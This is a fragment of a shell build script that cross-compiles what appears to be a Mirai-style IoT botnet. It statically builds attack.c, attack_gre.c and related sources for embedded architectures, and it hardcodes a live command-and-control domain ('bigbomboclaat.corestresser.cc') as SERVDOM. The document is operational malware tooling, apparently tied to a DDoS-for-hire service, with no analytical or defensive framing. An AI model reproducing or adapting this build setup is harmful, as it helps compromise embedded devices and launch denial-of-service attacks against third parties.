...
compile_arch() {
    ...
    # Compiler flags for uClibc
    local CFLAGS="-static -Os -fomit-frame-pointer -fdata-sections -ffunction-sections"
    local LDFLAGS="-static -Wl,--gc-sections -Wl,--strip-all"
    
    # Required feature test macros (found in all source files)
    CFLAGS="$CFLAGS -D_GNU_SOURCE"
    
    # Special build flags based on codebase analysis
    # DEBUG flag - enables debug output (remove for production)
    # CFLAGS="$CFLAGS -DDEBUG"  # Uncomment for debug builds
    
    # USEDOMAIN flag - enables domain resolution instead of hardcoded IPs
    # Note: If using USEDOMAIN, you need to define SERVDOM and SCANDOM constants
    # CFLAGS="$CFLAGS -DUSEDOMAIN"  # Uncomment if using domain names
    CFLAGS="$CFLAGS -DSERVDOM=\\\"bigbomboclaat.corestresser.cc\\\""  # Define CNC domain
    # CFLAGS="$CFLAGS -DSCANDOM=\\\"your-scan-domain.com\\\""  # Define scan domain
    
    # Additional flags for embedded systems
    CFLAGS="$CFLAGS -ffast-math -funroll-loops"
    
    # Disable stack protection for embedded systems
    CFLAGS="$CFLAGS -fno-stack-protector"
    
    # Optimize for size
    CFLAGS="$CFLAGS -s"
    
    # Additional flags based on codebase analysis
    # Enable inline functions (util.c uses inline functions)
    CFLAGS="$CFLAGS -finline-functions"
    
    # Handle packed structures (protocol.h uses __attribute__((packed)))
    CFLAGS="$CFLAGS -fpack-struct"
    
    # Enable register optimization (checksum.c uses register keyword)
    # Note: -O2 is added per-architecture as needed
    
    # Ensure proper endianness handling (uses htonl/ntohl functions)
    CFLAGS="$CFLAGS -D__USE_BSD"
    
    # Enable Linux-specific features (uses linux/ip.h, linux/tcp.h, etc.)
    CFLAGS="$CFLAGS -D__USE_MISC"
    
    # Enable socket options and ioctl support
    CFLAGS="$CFLAGS -D__USE_POSIX"
    
    # Fix socket type compatibility issues for cross-compilation
    CFLAGS="$CFLAGS -D__USE_XOPEN2K"
    CFLAGS="$CFLAGS -D_BSD_SOURCE"
    CFLAGS="$CFLAGS -D_DEFAULT_SOURCE"
    
    # Fix socket address structure compatibility
    CFLAGS="$CFLAGS -D_SOCKADDR_LEN"
    CFLAGS="$CFLAGS -D__FAVOR_BSD"
    
    # Additional socket compatibility flags
    CFLAGS="$CFLAGS -D_POSIX_C_SOURCE=200809L"
    CFLAGS="$CFLAGS -D_XOPEN_SOURCE=700"
    
    # Fix type casting issues for cross-compilation
    # Note: Some warning flags may not be supported by all cross-compilers
    ...
    if ! $CC $CFLAGS -o "$OUTPUT_DIR/$output_name" \
        main.c \
        attack.c \
        attack_app.c \
        attack_gre.c \
